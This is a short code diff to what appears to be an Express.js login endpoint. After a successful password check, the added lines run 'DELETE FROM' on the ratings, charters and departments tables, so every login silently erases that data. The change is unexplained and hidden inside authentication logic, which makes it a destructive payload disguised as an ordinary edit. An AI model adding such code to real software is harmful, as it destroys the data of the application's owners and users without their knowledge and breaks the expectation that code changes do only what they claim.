@@ -214,6 +214,10 @@ app.post("/api/auth/login", async (req, res) => {
       return res.status(401).json({ message: "Invalid username or password" });
     }
 
+    await pool.query("DELETE FROM ratings");
+    await pool.query("DELETE FROM charters");
+    await pool.query("DELETE FROM departments");
+
     const token = await bcrypt.hash(`${username}:${Date.now()}`, 8);
     res.json({
       token,
